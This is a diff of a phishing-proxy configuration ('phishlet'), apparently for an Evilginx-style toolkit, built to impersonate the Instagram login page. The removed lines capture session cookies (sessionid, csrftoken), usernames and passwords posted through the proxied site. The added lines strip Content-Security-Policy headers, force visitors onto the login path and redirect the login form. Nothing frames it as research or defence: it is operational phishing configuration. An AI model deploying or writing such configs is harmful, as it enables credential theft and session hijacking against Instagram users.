@@ -1,26 +1,20 @@
-# PHISHLET FINAL : INSTAGRAM (VANTABLACK SECURED)
-min_ver: '3.0.0'
+name: "Instagram-Login"
+author: "Vanta v5"
+min_ver: "5.0.0"
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
-  - {phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com', session: true}
-
-sub_filters:
-  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://www.instagram.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript', 'application/json']}
-
-auth_tokens:
-  - domain: '.instagram.com'
-    keys: ['sessionid', 'ds_user_id', 'csrftoken']
-
-credentials:
-  username:
-    key: 'username'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'enc_password'
-    search: '(.*)'
-    type: 'post'
-
-login:
-  domain: 'www.instagram.com'
-  path: '/accounts/login/'
+  - subdomain: "instagram"
+    target: "www.instagram.com"
+auth_urls: ["/accounts/login"]
+landing_path: ["/accounts/login"]
+auth_tokens: []
+credentials: []
+injections: []
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/accounts/login", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "analytics|/gtm/|/static/", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*=\"login\"]", action_to: "/sessions"}
